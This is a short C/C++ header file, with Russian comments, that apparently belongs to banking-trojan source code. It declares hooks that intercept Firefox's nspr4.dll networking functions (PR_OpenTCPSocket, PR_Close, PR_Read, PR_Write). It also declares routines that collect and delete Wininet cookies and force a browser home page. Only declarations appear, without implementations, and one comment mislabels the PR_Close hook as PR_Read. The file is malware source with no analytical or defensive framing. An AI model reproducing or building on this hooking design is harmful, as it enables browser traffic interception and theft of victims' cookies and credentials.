/*
  Перехват nspr4.dll
*/
#pragma once

#if(BO_NSPR4 > 0)
namespace Nspr4Hook
{
  /*
    Инициализация.

    IN homePage - принудительная установка домашней страницы, если NULL или [0]=0, то не применяется.
  */
  void init(const LPWSTR homePage);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Получение куков Wininet.
  */
  void _getCookies(void);

  /*
    Удаление куков Wininet.
  */
  void _removeCookies(void);

  /*
    Установка адерсов оригинальных функций. Функция должна вызываться в процессе ОДИН РАЗ.

    IN module       - модуль.
    IN readAddress  - адрес оригинальной PR_Read.
    IN writeAddress - адрес оригинальной PR_Write.
  */
  void updateAddresses(HMODULE moduleHandle, void *openTcpSocket, void *close, void *readAddress, void *writeAddress);

  /*
    Перехватчик PR_OpenTCPSocket.
  */
  void *__cdecl hookerPrOpenTcpSocket(int af);
  
  /*
    Перехватчик PR_Read.
  */
  int __cdecl hookerPrClose(void *fd);

  /*
    Перехватчик PR_Read.
  */
  __int32 __cdecl hookerPrRead(void *fd, void *buf, __int32 amount);
  
  /*
    Перехватчик PR_Write.
  */
  __int32 __cdecl hookerPrWrite(void *fd, const void *buf, __int32 amount);
};
#endif
